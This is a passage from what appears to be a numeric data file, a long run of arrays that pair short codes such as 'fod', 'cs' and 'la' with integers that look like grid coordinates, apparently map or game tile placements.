"fod", 1, 217, 299, 0], [1, "fod", 1, 215, 301, 0], [1, "fod", 1, 212, 300, 0], [1, "fod", 1, 206, 300, 0], [1, "fod", 1, 209, 301, 0], [1, "fod", 1, 204, 299, 0], [1, "fod", 1, 202, 301, 0], [1, "fod", 1, 199, 301, 0], [1, "fod", 1, 222, 282, 0], [1, "fod", 1, 207, 301, 0], [1, "fod", 1, 197, 301, 0], [1, "fod", 1, 215, 291, 0], [1, "fod", 1, 216, 286, 0], [1, "fod", 1, 214, 292, 0], [1, "fod", 1, 210, 289, 0], [1, "fod", 1, 208, 294, 0], [1, "fod", 1, 210, 298, 0], [1, "fod", 1, 212, 281, 0], [1, "fod", 1, 219, 278, 0], [1, "fod", 1, 219, 282, 0], [1, "fod", 1, 205, 286, 0], [1, "fod", 1, 202, 293, 0], [1, "fod", 1, 198, 295, 0], [1, "fod", 2, 213, 282, 0], [1, "fod", 2, 213, 291, 0], [1, "fod", 2, 216, 289, 0], [1, "fod", 2, 219, 289, 0], [1, "fod", 2, 218, 285, 0], [1, "fod", 2, 220, 283, 0], [1, "fod", 2, 211, 283, 0], [1, "fod", 2, 215, 281, 0], [1, "fod", 2, 217, 279, 0], [1, "fod", 2, 208, 290, 0], [1, "fod", 2, 211, 296, 0], [1, "fod", 2, 215, 294, 0], [1, "fod", 2, 212, 298, 0], [1, "fod", 2, 203, 294, 0], [1, "fod", 2, 204, 288, 0], [1, "fod", 2, 200, 294, 0], [1, "fod", 2, 198, 297, 0], [1, "fod", 2, 202, 299, 0], [1, "fod", 2, 200, 299, 0], [1, "fod", 2, 220, 300, 0], [1, "fod", 2, 220, 295, 0], [1, "fod", 2, 220, 292, 0], [1, "fod", 2, 219, 287, 0], [1, "fod", 2, 211, 288, 0], [1, "fod", 2, 213, 287, 0], [1, "fod", 2, 211, 289, 0], [1, "fod", 2, 212, 290, 0], [1, "fod", 2, 195, 296, 0], [1, "fod", 2, 196, 299, 0], [1, "fod", 2, 194, 300, 0], [1, "fod", 2, 195, 300, 0], [1, "fod", 2, 213, 279, 0], [1, "fod", 2, 211, 279, 0], [1, "fod", 0, 218, 290, 0], [1, "fod", 0, 212, 294, 0], [1, "fod", 1, 213, 295, 0], [1, "fod", 1, 217, 292, 0], [1, "fod", 1, 218, 288, 0], [1, "fod", 1, 210, 295, 0], [1, "fod", 1, 213, 292, 0], [1, "fod", 1, 212, 289, 0], [1, "fod", 1, 205, 295, 0], [1, "fod", 2, 206, 296, 0], [1, "fod", 2, 208, 296, 0], [1, "fod", 2, 221, 288, 0], [1, "fod", 2, 209, 299, 0], [1, "fod", 2, 211, 291, 0], [1, "fod", 1, 203, 275, 0], [1, "fod", 1, 204, 272, 0], [1, "fod", 2, 205, 273, 0], [1, "fod", 2, 204, 276, 0], [1, "fod", 2, 202, 276, 0], [1, "fod", 2, 199, 277, 0], [1, "fod", 2, 202, 273, 0], [1, "fod", 2, 199, 270, 0], [1, "fod", 2, 194, 274, 0], [1, "fod", 2, 194, 277, 0], [1, "fod", 1, 192, 274, 0], [1, "fod", 1, 194, 267, 0], [1, "fod", 2, 194, 265, 0], [1, "fod", 2, 190, 272, 0], [1, "fod", 2, 191, 275, 0], [1, "fod", 2, 195, 274, 0], [1, "fod", 2, 200, 271, 0], [1, "fod", 1, 168, 243, 0], [1, "fod", 1, 175, 240, 0], [1, "fod", 1, 169, 234, 0], [1, "fod", 1, 162, 235, 0], [1, "fod", 2, 169, 236, 0], [1, "fod", 2, 171, 234, 0], [1, "fod", 2, 165, 238, 0], [1, "fod", 2, 173, 241, 0], [1, "fod", 2, 174, 238, 0], [1, "fod", 2, 176, 240, 0], [1, "fod", 2, 169, 244, 0], [1, "fod", 2, 166, 243, 0], [1, "fod", 2, 162, 236, 0], [1, "fod", 2, 164, 235, 0], [1, "fod", 2, 162, 233, 0], [1, "fod", 2, 163, 236, 0], [1, "fod", 2, 174, 242, 0], [1, "fod", 2, 171, 243, 0], [1, "fod", 1, 194, 206, 0], [1, "fod", 1, 190, 214, 0], [1, "fod", 1, 186, 206, 0], [1, "fod", 1, 197, 207, 0], [1, "fod", 2, 196, 208, 0], [1, "fod", 2, 198, 206, 0], [1, "fod", 2, 198, 208, 0], [1, "fod", 2, 194, 204, 0], [1, "fod", 2, 187, 206, 0], [1, "fod", 2, 186, 204, 0], [1, "fod", 2, 189, 214, 0], [1, "fod", 2, 189, 213, 0], [1, "fod", 2, 193, 215, 0], [1, "fod", 2, 194, 214, 0], [1, "fod", 2, 187, 215, 0], [1, "fod", 2, 193, 209, 0], [1, "fod", 2, 189, 211, 0], [1, "fod", 2, 187, 209, 0], [1, "fod", 2, 187, 207, 0], [1, "fod", 2, 191, 205, 0], [1, "fod", 2, 189, 203, 0], [1, "cs", 2, 224, 176, 1], [1, "cs", 0, 224, 177, 1], [1, "cs", 3, 224, 178, 1], [1, "cs", 2, 224, 179, 1], [1, "cs", 1, 224, 180, 1], [1, "cs", 2, 224, 181, 1], [1, "cs", 0, 224, 182, 1], [1, "cs", 2, 224, 183, 1], [1, "cs", 0, 224, 184, 1], [1, "cs", 3, 224, 185, 1], [1, "cs", 2, 224, 186, 1], [1, "cs", 0, 224, 187, 1], [1, "cs", 2, 224, 188, 1], [1, "cs", 0, 224, 189, 1], [1, "cs", 1, 224, 190, 1], [1, "cs", 2, 224, 191, 1], [1, "cs", 0, 224, 192, 1], [1, "cs", 2, 224, 193, 1], [1, "cs", 2, 224, 194, 1], [1, "cs", 1, 224, 195, 1], [1, "cs", 2, 224, 196, 1], [1, "cs", 0, 224, 197, 1], [1, "cs", 3, 224, 198, 1], [1, "cs", 2, 224, 199, 1], [1, "cs", 1, 224, 200, 1], [1, "cs", 2, 224, 201, 1], [1, "cs", 3, 224, 202, 1], [1, "cs", 0, 224, 203, 1], [1, "cs", 1, 224, 204, 1], [1, "cs", 2, 224, 205, 1], [1, "cs", 0, 224, 206, 1], [1, "cs", 1, 224, 207, 1], [1, "cs", 3, 224, 208, 1], [1, "cs", 2, 224, 209, 1], [1, "cs", 2, 224, 210, 1], [1, "cs", 0, 223, 211, 1], [1, "cs", 1, 224, 211, 1], [1, "cs", 2, 224, 212, 1], [1, "cs", 2, 224, 213, 1], [1, "cs", 1, 224, 214, 1], [1, "cs", 3, 224, 215, 1], [1, "cs", 0, 224, 216, 1], [1, "cs", 1, 224, 217, 1], [1, "cs", 2, 224, 218, 1], [1, "cs", 3, 224, 219, 1], [1, "cs", 0, 223, 215, 1], [1, "cs", 2, 223, 214, 1], [1, "cs", 2, 223, 212, 1], [1, "cs", 2, 223, 216, 1], [1, "cs", 3, 223, 217, 1], [1, "cs", 0, 223, 218, 1], [1, "cs", 0, 224, 220, 1], [1, "cs", 0, 224, 222, 1], [1, "cs", 0, 223, 209, 1], [1, "cs", 0, 223, 205, 1], [1, "cs", 2, 224, 221, 1], [1, "cs", 2, 223, 219, 1], [1, "cs", 2, 223, 220, 1], [1, "cs", 2, 223, 213, 1], [1, "cs", 2, 223, 210, 1], [1, "cs", 1, 223, 178, 1], [1, "cs", 3, 223, 179, 1], [1, "cs", 3, 223, 181, 1], [1, "cs", 3, 223, 182, 1], [1, "cs", 1, 223, 185, 1], [1, "cs", 2, 223, 184, 1], [1, "cs", 2, 223, 186, 1], [1, "cs", 0, 223, 180, 1], [1, "cs", 0, 223, 183, 1], [1, "cs", 2, 223, 187, 1], [1, "cs", 1, 223, 188, 1], [1, "cs", 2, 223, 189, 1], [1, "cs", 2, 223, 190, 1], [1, "cs", 3, 223, 191, 1], [1, "cs", 1, 223, 192, 1], [1, "cs", 2, 223, 193, 1], [1, "cs", 2, 223, 194, 1], [1, "cs", 3, 223, 195, 1], [1, "cs", 1, 223, 196, 1], [1, "cs", 2, 223, 197, 1], [1, "cs", 2, 223, 199, 1], [1, "cs", 2, 223, 198, 1], [1, "cs", 0, 223, 200, 1], [1, "cs", 2, 223, 201, 1], [1, "cs", 0, 223, 202, 1], [1, "cs", 3, 223, 203, 1], [1, "cs", 3, 223, 204, 1], [1, "cs", 3, 223, 206, 1], [1, "cs", 3, 223, 207, 1], [1, "cs", 3, 223, 208, 1], [1, "cs", 2, 223, 221, 1], [1, "cs", 2, 223, 222, 1], [1, "cs", 0, 223, 224, 1], [1, "cs", 0, 224, 228, 1], [1, "cs", 0, 224, 230, 1], [1, "cs", 0, 223, 234, 1], [1, "cs", 2, 223, 223, 1], [1, "cs", 2, 224, 223, 1], [1, "cs", 2, 224, 224, 1], [1, "cs", 2, 224, 225, 1], [1, "cs", 1, 223, 226, 1], [1, "cs", 1, 224, 231, 1], [1, "cs", 1, 223, 232, 1], [1, "cs", 3, 223, 225, 1], [1, "cs", 3, 224, 226, 1], [1, "cs", 3, 223, 227, 1], [1, "cs", 3, 224, 227, 1], [1, "cs", 3, 223, 229, 1], [1, "cs", 3, 223, 228, 1], [1, "cs", 3, 224, 229, 1], [1, "cs", 3, 223, 230, 1], [1, "cs", 3, 223, 231, 1], [1, "cs", 3, 224, 232, 1], [1, "cs", 3, 224, 233, 1], [1, "cs", 3, 223, 233, 1], [1, "cs", 3, 224, 234, 1], [1, "cs", 3, 224, 235, 1], [1, "cs", 3, 223, 235, 1], [1, "cs", 1, 224, 236, 1], [1, "cs", 2, 223, 236, 1], [1, "cs", 2, 223, 237, 1], [1, "cs", 3, 224, 237, 1], [1, "cs", 3, 224, 238, 1], [1, "cs", 0, 224, 239, 1], [1, "cs", 1, 223, 241, 1], [1, "cs", 0, 224, 243, 1], [1, "cs", 0, 223, 245, 1], [1, "cs", 0, 224, 247, 1], [1, "cs", 2, 223, 240, 1], [1, "cs", 2, 223, 239, 1], [1, "cs", 2, 224, 240, 1], [1, "cs", 2, 224, 241, 1], [1, "cs", 2, 224, 242, 1], [1, "cs", 2, 223, 242, 1], [1, "cs", 2, 223, 243, 1], [1, "cs", 2, 223, 244, 1], [1, "cs", 2, 224, 244, 1], [1, "cs", 2, 224, 245, 1], [1, "cs", 2, 224, 246, 1], [1, "cs", 3, 223, 238, 1], [1, "cs", 3, 223, 246, 1], [1, "cs", 2, 223, 247, 1], [1, "cs", 1, 223, 249, 1], [1, "cs", 1, 224, 253, 1], [1, "cs", 1, 223, 256, 1], [1, "cs", 0, 223, 254, 1], [1, "cs", 0, 224, 250, 1], [1, "cs", 3, 223, 248, 1], [1, "cs", 3, 223, 250, 1], [1, "cs", 3, 223, 252, 1], [1, "cs", 3, 223, 255, 1], [1, "cs", 3, 223, 257, 1], [1, "cs", 2, 224, 248, 1], [1, "cs", 2, 224, 249, 1], [1, "cs", 2, 223, 251, 1], [1, "cs", 2, 224, 251, 1], [1, "cs", 2, 224, 252, 1], [1, "cs", 2, 223, 253, 1], [1, "cs", 2, 224, 254, 1], [1, "cs", 2, 224, 255, 1], [1, "cs", 2, 224, 256, 1], [1, "cs", 2, 224, 257, 1], [1, "cs", 0, 224, 258, 1], [1, "cs", 0, 223, 261, 1], [1, "cs", 0, 224, 263, 1], [1, "cs", 0, 224, 266, 1], [1, "cs", 0, 224, 272, 1], [1, "cs", 0, 223, 270, 1], [1, "cs", 0, 223, 275, 1], [1, "cs", 1, 223, 259, 1], [1, "cs", 1, 223, 264, 1], [1, "cs", 1, 223, 268, 1], [1, "cs", 1, 224, 274, 1], [1, "cs", 2, 223, 258, 1], [1, "cs", 2, 223, 260, 1], [1, "cs", 2, 223, 263, 1], [1, "cs", 2, 223, 265, 1], [1, "cs", 2, 223, 267, 1], [1, "cs", 2, 223, 271, 1], [1, "cs", 2, 223, 273, 1], [1, "cs", 3, 223, 262, 1], [1, "cs", 3, 223, 266, 1], [1, "cs", 3, 223, 269, 1], [1, "cs", 3, 223, 272, 1], [1, "cs", 3, 223, 274, 1], [1, "cs", 3, 224, 275, 1], [1, "cs", 3, 224, 273, 1], [1, "cs", 3, 224, 271, 1], [1, "cs", 3, 224, 270, 1], [1, "cs", 3, 224, 269, 1], [1, "cs", 3, 224, 268, 1], [1, "cs", 3, 224, 267, 1], [1, "cs", 3, 224, 265, 1], [1, "cs", 3, 224, 264, 1], [1, "cs", 3, 224, 262, 1], [1, "cs", 3, 224, 261, 1], [1, "cs", 3, 224, 260, 1], [1, "cs", 3, 224, 259, 1], [1, "cs", 2, 223, 276, 1], [1, "cs", 1, 224, 276, 1], [1, "cs", 1, 224, 280, 1], [1, "cs", 1, 223, 281, 1], [1, "cs", 1, 224, 286, 1], [1, "cs", 0, 223, 280, 1], [1, "cs", 0, 223, 284, 1], [1, "cs", 0, 224, 288, 1], [1, "cs", 0, 224, 279, 1], [1, "cs", 2, 223, 277, 1], [1, "cs", 2, 224, 277, 1], [1, "cs", 2, 224, 278, 1], [1, "cs", 2, 224, 281, 1], [1, "cs", 2, 224, 283, 1], [1, "cs", 2, 224, 282, 1], [1, "cs", 2, 224, 284, 1], [1, "cs", 2, 224, 285, 1], [1, "cs", 2, 224, 287, 1], [1, "cs", 2, 223, 287, 1], [1, "cs", 2, 223, 285, 1], [1, "cs", 2, 223, 283, 1], [1, "cs", 2, 223, 279, 1], [1, "cs", 3, 223, 278, 1], [1, "cs", 3, 223, 282, 1], [1, "cs", 3, 223, 286, 1], [1, "cs", 3, 223, 289, 1], [1, "cs", 3, 224, 289, 1], [1, "cs", 2, 223, 288, 1], [1, "cs", 2, 224, 290, 1], [1, "cs", 1, 223, 290, 1], [1, "cs", 0, 224, 292, 1], [1, "cs", 0, 223, 294, 1], [1, "cs", 0, 224, 297, 1], [1, "cs", 0, 223, 299, 1], [1, "cs", 2, 223, 291, 1], [1, "cs", 2, 224, 291, 1], [1, "cs", 2, 223, 292, 1], [1, "cs", 2, 223, 293, 1], [1, "cs", 2, 224, 293, 1], [1, "cs", 2, 224, 294, 1], [1, "cs", 1, 224, 295, 1], [1, "cs", 2, 223, 295, 1], [1, "cs", 2, 223, 296, 1], [1, "cs", 2, 224, 296, 1], [1, "cs", 2, 223, 297, 1], [1, "cs", 2, 223, 298, 1], [1, "cs", 2, 224, 298, 1], [1, "cs", 2, 224, 299, 1], [1, "cs", 2, 223, 300, 1], [1, "cs", 1, 224, 300, 1], [1, "cs", 0, 223, 301, 1], [1, "cs", 0, 224, 302, 1], [1, "cs", 0, 224, 304, 1], [1, "cs", 3, 224, 301, 1], [1, "cs", 3, 224, 303, 1], [1, "cs", 0, 221, 303, 1], [1, "cs", 0, 219, 304, 1], [1, "cs", 1, 222, 304, 1], [1, "cs", 1, 222, 302, 1], [1, "cs", 2, 223, 302, 1], [1, "cs", 2, 223, 303, 1], [1, "cs", 2, 222, 303, 1], [1, "cs", 2, 223, 304, 1], [1, "cs", 2, 221, 304, 1], [1, "cs", 2, 220, 304, 1], [1, "cs", 2, 220, 303, 1], [1, "cs", 2, 220, 302, 1], [1, "cs", 2, 221, 302, 1], [1, "cs", 2, 219, 303, 1], [1, "cs", 0, 217, 302, 1], [1, "cs", 0, 215, 304, 1], [1, "cs", 0, 214, 302, 1], [1, "cs", 1, 218, 302, 1], [1, "cs", 1, 217, 304, 1], [1, "cs", 1, 215, 302, 1], [1, "cs", 2, 219, 302, 1], [1, "cs", 2, 218, 303, 1], [1, "cs", 2, 218, 304, 1], [1, "cs", 2, 217, 303, 1], [1, "cs", 2, 216, 304, 1], [1, "cs", 2, 215, 303, 1], [1, "cs", 2, 216, 303, 1], [1, "cs", 2, 216, 302, 1], [1, "cs", 2, 214, 303, 1], [1, "cs", 2, 214, 304, 1], [1, "cs", 0, 212, 302, 1], [1, "cs", 0, 210, 303, 1], [1, "cs", 0, 212, 304, 1], [1, "cs", 0, 208, 304, 1], [1, "cs", 1, 210, 302, 1], [1, "cs", 1, 208, 303, 1], [1, "cs", 2, 213, 302, 1], [1, "cs", 2, 213, 303, 1], [1, "cs", 2, 213, 304, 1], [1, "cs", 2, 212, 303, 1], [1, "cs", 2, 211, 304, 1], [1, "cs", 2, 211, 303, 1], [1, "cs", 2, 211, 302, 1], [1, "cs", 2, 209, 302, 1], [1, "cs", 2, 209, 303, 1], [1, "cs", 2, 209, 304, 1], [1, "cs", 2, 210, 304, 1], [1, "cs", 2, 208, 302, 1], [1, "cs", 0, 206, 303, 1], [1, "cs", 0, 203, 304, 1], [1, "cs", 0, 200, 303, 1], [1, "cs", 0, 199, 304, 1], [1, "cs", 0, 195, 304, 1], [1, "cs", 0, 191, 303, 1], [1, "cs", 0, 193, 304, 1], [1, "cs", 0, 189, 304, 1], [1, "cs", 1, 204, 303, 1], [1, "cs", 0, 197, 302, 1], [1, "cs", 0, 202, 302, 1], [1, "cs", 0, 188, 302, 1], [1, "cs", 0, 194, 302, 1], [1, "cs", 1, 197, 303, 1], [1, "cs", 1, 201, 304, 1], [1, "cs", 1, 192, 302, 1], [1, "cs", 1, 189, 303, 1], [1, "cs", 1, 205, 302, 1], [1, "cs", 1, 188, 304, 1], [1, "cs", 2, 207, 302, 1], [1, "cs", 2, 207, 303, 1], [1, "cs", 2, 207, 304, 1], [1, "cs", 2, 206, 304, 1], [1, "cs", 2, 206, 302, 1], [1, "cs", 2, 205, 303, 1], [1, "cs", 2, 204, 304, 1], [1, "cs", 2, 205, 304, 1], [1, "cs", 2, 204, 302, 1], [1, "cs", 2, 203, 302, 1], [1, "cs", 2, 203, 303, 1], [1, "cs", 2, 202, 303, 1], [1, "cs", 2, 201, 303, 1], [1, "cs", 2, 201, 302, 1], [1, "cs", 2, 200, 302, 1], [1, "cs", 2, 199, 302, 1], [1, "cs", 2, 198, 303, 1], [1, "cs", 2, 198, 302, 1], [1, "cs", 2, 199, 303, 1], [1, "cs", 2, 200, 304, 1], [1, "cs", 2, 202, 304, 1], [1, "cs", 2, 197, 304, 1], [1, "cs", 2, 198, 304, 1], [1, "cs", 2, 196, 304, 1], [1, "cs", 2, 196, 303, 1], [1, "cs", 2, 196, 302, 1], [1, "cs", 2, 195, 302, 1], [1, "cs", 2, 195, 303, 1], [1, "cs", 2, 194, 303, 1], [1, "cs", 2, 194, 304, 1], [1, "cs", 2, 193, 303, 1], [1, "cs", 2, 193, 302, 1], [1, "cs", 2, 192, 303, 1], [1, "cs", 2, 192, 304, 1], [1, "cs", 2, 191, 304, 1], [1, "cs", 2, 190, 304, 1], [1, "cs", 2, 190, 303, 1], [1, "cs", 2, 189, 302, 1], [1, "cs", 2, 190, 302, 1], [1, "cs", 2, 191, 302, 1], [1, "cs", 2, 188, 303, 1], [1, "cs", 0, 186, 303, 1], [1, "cs", 0, 183, 304, 1], [1, "cs", 0, 184, 302, 1], [1, "cs", 0, 181, 302, 1], [1, "cs", 0, 176, 302, 1], [1, "cs", 0, 178, 303, 1], [1, "cs", 0, 173, 304, 1], [1, "cs", 0, 170, 303, 1], [1, "cs", 0, 172, 302, 1], [1, "cs", 1, 182, 303, 1], [1, "cs", 1, 178, 304, 1], [1, "cs", 1, 175, 304, 1], [1, "cs", 1, 173, 302, 1], [1, "cs", 1, 185, 304, 1], [1, "cs", 1, 169, 304, 1], [1, "cs", 3, 187, 304, 1], [1, "cs", 3, 186, 304, 1], [1, "cs", 3, 187, 303, 1], [1, "cs", 3, 187, 302, 1], [1, "cs", 3, 186, 302, 1], [1, "cs", 3, 185, 302, 1], [1, "cs", 3, 185, 303, 1], [1, "cs", 3, 184, 303, 1], [1, "cs", 3, 183, 303, 1], [1, "cs", 3, 183, 302, 1], [1, "cs", 3, 182, 302, 1], [1, "cs", 3, 184, 304, 1], [1, "cs", 3, 182, 304, 1], [1, "cs", 3, 181, 304, 1], [1, "cs", 3, 179, 304, 1], [1, "cs", 3, 180, 304, 1], [1, "cs", 3, 181, 303, 1], [1, "cs", 3, 180, 303, 1], [1, "cs", 3, 179, 303, 1], [1, "cs", 3, 180, 302, 1], [1, "cs", 3, 179, 302, 1], [1, "cs", 3, 178, 302, 1], [1, "cs", 3, 177, 302, 1], [1, "cs", 3, 177, 304, 1], [1, "cs", 3, 177, 303, 1], [1, "cs", 3, 176, 303, 1], [1, "cs", 3, 176, 304, 1], [1, "cs", 3, 174, 304, 1], [1, "cs", 3, 175, 303, 1], [1, "cs", 3, 174, 303, 1], [1, "cs", 3, 173, 303, 1], [1, "cs", 3, 172, 303, 1], [1, "cs", 3, 171, 303, 1], [1, "cs", 3, 170, 304, 1], [1, "cs", 3, 171, 304, 1], [1, "cs", 3, 172, 304, 1], [1, "cs", 3, 174, 302, 1], [1, "cs", 3, 175, 302, 1], [1, "cs", 3, 171, 302, 1], [1, "cs", 3, 170, 302, 1], [1, "cs", 3, 169, 302, 1], [1, "cs", 3, 169, 303, 1], [1, "cs", 0, 168, 302, 1], [1, "cs", 0, 166, 303, 1], [1, "cs", 0, 163, 304, 1], [1, "cs", 0, 161, 302, 1], [1, "cs", 0, 159, 303, 1], [1, "cs", 0, 152, 304, 1], [1, "cs", 0, 155, 303, 1], [1, "cs", 1, 164, 303, 1], [1, "cs", 1, 162, 303, 1], [1, "cs", 1, 158, 304, 1], [1, "cs", 1, 156, 302, 1], [1, "cs", 1, 153, 302, 1], [1, "cs", 1, 154, 304, 1], [1, "cs", 2, 168, 304, 1], [1, "cs", 2, 168, 303, 1], [1, "cs", 2, 167, 303, 1], [1, "cs", 2, 167, 304, 1], [1, "cs", 2, 166, 304, 1], [1, "cs", 2, 165, 304, 1], [1, "cs", 2, 164, 304, 1], [1, "cs", 2, 165, 303, 1], [1, "cs", 2, 167, 302, 1], [1, "cs", 2, 166, 302, 1], [1, "cs", 2, 165, 302, 1], [1, "cs", 2, 164, 302, 1], [1, "cs", 2, 163, 302, 1], [1, "cs", 2, 162, 302, 1], [1, "cs", 2, 163, 303, 1], [1, "cs", 2, 162, 304, 1], [1, "cs", 2, 160, 304, 1], [1, "cs", 2, 159, 304, 1], [1, "cs", 2, 161, 304, 1], [1, "cs", 2, 161, 303, 1], [1, "cs", 2, 160, 303, 1], [1, "cs", 2, 160, 302, 1], [1, "cs", 2, 158, 302, 1], [1, "cs", 2, 159, 302, 1], [1, "cs", 2, 157, 302, 1], [1, "cs", 2, 156, 303, 1], [1, "cs", 2, 157, 303, 1], [1, "cs", 2, 158, 303, 1], [1, "cs", 2, 157, 304, 1], [1, "cs", 2, 156, 304, 1], [1, "cs", 2, 155, 304, 1], [1, "cs", 2, 153, 304, 1], [1, "cs", 2, 153, 303, 1], [1, "cs", 2, 154, 303, 1], [1, "cs", 2, 154, 302, 1], [1, "cs", 2, 155, 302, 1], [1, "cs", 2, 152, 303, 1], [1, "cs", 2, 152, 302, 1], [1, "cs", 0, 151, 302, 1], [1, "cs", 0, 149, 303, 1], [1, "cs", 0, 145, 304, 1], [1, "cs", 0, 147, 302, 1], [1, "cs", 0, 143, 303, 1], [1, "cs", 0, 141, 303, 1], [1, "cs", 1, 147, 304, 1], [1, "cs", 1, 145, 302, 1], [1, "cs", 1, 142, 302, 1], [1, "cs", 1, 150, 304, 1], [1, "cs", 2, 151, 304, 1], [1, "cs", 2, 151, 303, 1], [1, "cs", 2, 150, 303, 1], [1, "cs", 2, 150, 302, 1], [1, "cs", 2, 148, 302, 1], [1, "cs", 2, 146, 302, 1], [1, "cs", 2, 144, 302, 1], [1, "cs", 2, 141, 302, 1], [1, "cs", 2, 141, 304, 1], [1, "cs", 2, 142, 304, 1], [1, "cs", 2, 142, 303, 1], [1, "cs", 2, 143, 304, 1], [1, "cs", 2, 144, 304, 1], [1, "cs", 2, 144, 303, 1], [1, "cs", 2, 148, 304, 1], [1, "cs", 2, 148, 303, 1], [1, "cs", 2, 146, 303, 1], [1, "cs", 2, 145, 303, 1], [1, "cs", 2, 147, 303, 1], [1, "cs", 2, 146, 304, 1], [1, "cs", 2, 149, 304, 1], [1, "cs", 3, 149, 302, 1], [1, "cs", 3, 143, 302, 1], [1, "cs", 0, 139, 304, 1], [1, "cs", 0, 138, 302, 1], [1, "cs", 1, 139, 302, 1], [1, "cs", 2, 140, 302, 1], [1, "cs", 2, 140, 303, 1], [1, "cs", 2, 139, 303, 1], [1, "cs", 2, 138, 303, 1], [1, "cs", 2, 138, 304, 1], [1, "cs", 2, 140, 304, 1], [1, "cs", 0, 137, 304, 1], [1, "cs", 0, 135, 303, 1], [1, "cs", 0, 133, 304, 1], [1, "cs", 1, 135, 304, 1], [1, "cs", 1, 136, 302, 1], [1, "cs", 2, 137, 302, 1], [1, "cs", 2, 136, 303, 1], [1, "cs", 2, 137, 303, 1], [1, "cs", 2, 136, 304, 1], [1, "cs", 2, 134, 304, 1], [1, "cs", 2, 134, 303, 1], [1, "cs", 2, 133, 303, 1], [1, "cs", 2, 132, 304, 1], [1, "cs", 0, 131, 302, 1], [1, "cs", 0, 134, 302, 1], [1, "cs", 0, 129, 304, 1], [1, "cs", 1, 130, 303, 1], [1, "cs", 1, 132, 302, 1], [1, "cs", 2, 135, 302, 1], [1, "cs", 2, 133, 302, 1], [1, "cs", 2, 132, 303, 1], [1, "cs", 2, 131, 303, 1], [1, "cs", 2, 130, 304, 1], [1, "cs", 2, 131, 304, 1], [1, "cs", 2, 128, 304, 1], [1, "cs", 2, 129, 303, 1], [1, "cs", 2, 130, 302, 1], [1, "cs", 3, 127, 304, 1], [1, "cs", 2, 132, 301, 1], [1, "cs", 2, 133, 301, 1], [1, "cs", 2, 134, 301, 1], [1, "cs", 2, 135, 301, 1], [1, "cs", 3, 131, 301, 1], [1, "cs", 3, 136, 301, 1], [1, "cs", 3, 136, 178, 1], [1, "cs", 0, 136, 183, 1], [1, "cs", 2, 136, 182, 1], [1, "cs", 1, 136, 181, 1], [1, "cs", 0, 136, 179, 1], [1, "cs", 3, 136, 180, 1], [1, "cs", 2, 135, 183, 1], [1, "cs", 1, 135, 182, 1], [1, "cs", 3, 135, 180, 1], [1, "cs", 0, 134, 183, 1], [1, "cs", 2, 133, 183, 1], [1, "cs", 3, 133, 182, 1], [1, "cs", 1, 132, 183, 1], [1, "cs", 3, 131, 183, 1], [1, "cs", 2, 135, 181, 1], [1, "cs", 2, 134, 182, 1], [1, "cs", 3, 134, 181, 1], [1, "fod", 0, 213, 301, 0], [1, "fod", 0, 204, 301, 0], [1, "fod", 1, 196, 288, 0], [1, "fod", 1, 198, 283, 0], [1, "fod", 1, 190, 288, 0], [1, "fod", 1, 189, 296, 0], [1, "fod", 1, 193, 293, 0], [1, "fod", 1, 183, 292, 0], [1, "fod", 1, 186, 287, 0], [1, "fod", 1, 190, 290, 0], [1, "fod", 1, 218, 271, 0], [1, "fod", 1, 220, 266, 0], [1, "fod", 1, 211, 268, 0], [1, "fod", 1, 210, 274, 0], [1, "fod", 1, 205, 263, 0], [1, "fod", 1, 216, 258, 0], [1, "fod", 2, 201, 294, 0], [1, "fod", 2, 190, 296, 0], [1, "fod", 2, 188, 299, 0], [1, "fod", 2, 186, 297, 0], [1, "fod", 2, 188, 296, 0], [1, "fod", 2, 189, 291, 0], [1, "fod", 2, 189, 286, 0], [1, "fod", 2, 191, 286, 0], [1, "fod", 2, 197, 286, 0], [1, "fod", 2, 195, 290, 0], [1, "fod", 2, 186, 288, 0], [1, "fod", 2, 184, 290, 0], [1, "fod", 2, 183, 293, 0], [1, "fod", 2, 198, 286, 0], [1, "fod", 2, 196, 283, 0], [1, "fod", 2, 196, 281, 0], [1, "fod", 2, 201, 280, 0], [1, "fod", 2, 205, 287, 0], [1, "fod", 2, 209, 283, 0], [1, "fod", 2, 212, 280, 0], [1, "fod", 2, 209, 277, 0], [1, "fod", 2, 217, 278, 0], [1, "fod", 2, 219, 275, 0], [1, "fod", 2, 220, 271, 0], [1, "fod", 2, 220, 267, 0], [1, "fod", 2, 217, 265, 0], [1, "fod", 2, 213, 267, 0], [1, "fod", 2, 208, 264, 0], [1, "fod", 2, 206, 261, 0], [1, "fod", 2, 203, 265, 0], [1, "fod", 2, 204, 270, 0], [1, "fod", 2, 196, 267, 0], [1, "fod", 2, 214, 261, 0], [1, "fod", 2, 211, 260, 0], [1, "fod", 2, 218, 256, 0], [1, "fod", 2, 219, 262, 0], [1, "fod", 2, 220, 253, 0], [1, "fod", 2, 211, 257, 0], [1, "la", 3, 198, 27, 1], [1, "la", 3, 201, 30, 1], [1, "la", 3, 200, 32, 1], [1, "la", 3, 198, 33, 1], [1, "la", 3, 196, 33, 1], [1, "la", 3, 194, 32, 1], [1, "la", 3, 194, 28, 1], [1, "la", 0, 200, 28, 1], [1, "la", 0, 193, 30, 1], [1, "la", 3, 196, 27, 1], [1, "la", 3, 199, 30, 1], [1, "la", 3, 197, 29, 1], [1, "la", 3, 195, 30, 1], [1, "la", 3, 197, 31, 1], [1, "la", 2, 201, 33, 1], [1, "la", 4, 202, 34, 1], [1, "la", 4, 202, 35, 1], [1, "la", 4, 203, 36, 1], [1, "la", 4, 204, 37, 1], [1, "la", 2, 205, 38, 1], [1, "la", 5, 205, 39, 1], [1, "la", 5, 205, 40, 1], [1, "la", 2, 206, 41, 1], [1, "la", 1, 207, 42, 1], [1, "la", 1, 205, 41, 1], [1, "la", 4, 208, 43, 1], [1, "la", 4, 209, 43, 1], [1, "la", 1, 210, 43, 1], [1, "la", 2, 211, 43, 1], [1, "la", 5, 212, 43, 1], [1, "la", 4, 213, 44, 1], [1, "la", 3, 223, 54, 1], [1, "la", 3, 221, 53, 1], [1, "la", 3, 219, 53, 1], [1, "la", 4, 218, 52, 1], [1, "la", 4, 217, 51, 1], [1, "la", 4, 216, 51, 1], [1, "la", 1, 215, 50, 1], [1, "la", 4, 212, 46, 1], [1, "la", 1, 210, 44, 1], [1, "la", 3, 206, 50, 1], [1, "re", 0, 217, 24, 1], [1, "re", 0, 207, 16, 1], [1, "de", 44, 54, 14, 0], [1, "de", 44, 53, 13, 0], [1, "de", 44, 51, 16, 0], [1, "de", 44, 49, 13, 0], [1, "de", 44, 48, 14, 0], [1, "de", 21, 78, 293, 0], [1, "cs", 0, 221, 8, 1], [1, 